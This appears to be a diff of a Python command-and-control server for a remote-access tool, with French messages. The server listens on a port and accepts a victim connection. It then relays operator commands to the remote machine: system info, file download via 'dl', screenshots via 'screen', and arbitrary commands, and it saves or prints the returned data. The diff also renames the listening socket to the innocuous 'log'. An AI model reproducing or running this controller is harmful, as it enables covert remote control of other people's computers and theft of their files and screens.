@@ -4,15 +4,15 @@ HOST_IP = ""
 HOST_PORT = 32000
 MAX_DATA_SIZE = 1024
 
-def socket_receive_all_data(socket_p, data_len):
+def socket_data(socket, data_len):
     current_data_len = 0
     total_data = None
-    # print("socket_receive_all_data len:", data_len)
+    # print("socket_data len:", data_len)
     while current_data_len < data_len:
         chunk_len = data_len - current_data_len
         if chunk_len > MAX_DATA_SIZE:
             chunk_len = MAX_DATA_SIZE
-        data = socket_p.recv(chunk_len)
+        data = socket.recv(chunk_len)
         # print("  len:", len(data))
         if not data:
             return None
@@ -24,32 +24,32 @@ def socket_receive_all_data(socket_p, data_len):
         # print("  total len:", current_data_len, "/", data_len)
     return total_data
 
-def socket_send_command_and_receive_all_data(socket_p, command):
+def socket_command(socket, command):
     if not command:  # if command == ""
         return None
-    socket_p.sendall(command.encode())
+    socket.sendall(command.encode())
 
-    header_data = socket_receive_all_data(socket_p, 13)
+    header_data = socket_data(socket, 13)
     longeur_data = int(header_data.decode())
 
-    data_recues = socket_receive_all_data(socket_p, longeur_data)
+    data_recues = socket_data(socket, longeur_data)
     return data_recues
 
 
-s = socket.socket()
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind((HOST_IP, HOST_PORT))
-s.listen()
+log = socket.socket()
+log.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+log.bind((HOST_IP, HOST_PORT))
+log.listen()
 
 print(f"Tentative de connexion sur {HOST_IP}, port {HOST_PORT}...")
-connection_socket, client_address = s.accept()
+connection_socket, client_address = log.accept()
 print(f"Connexion établie avec {client_address}")
 
 dl_filename = None
 
 while True:
     # ... infos
-    infos_data = socket_send_command_and_receive_all_data(connection_socket, "infos")
+    infos_data = socket_command(connection_socket, "system")
     if not infos_data:
         break
     commande = input(client_address[0]+":"+str(client_address[1])+ " " + 
@@ -58,10 +58,10 @@ while True:
     commande_split = commande.split(" ")
     if len(commande_split) == 2 and commande_split[0] == "dl":
         dl_filename = commande_split[1]
-    if len(commande_split) == 2 and commande_split[0] == "screen":
-        dl_filename = commande_split[1] + ".png"  
+    elif len(commande_split) == 2 and commande_split[0] == "screen":
+        dl_filename = commande_split[1] + ".png"
 
-    data_recues = socket_send_command_and_receive_all_data(connection_socket, commande)
+    data_recues = socket_command(connection_socket, commande)
     if not data_recues:
         break
 
@@ -77,5 +77,5 @@ while True:
     else:
         print(data_recues.decode())
 
-s.close()
+log.close()
 connection_socket.close()
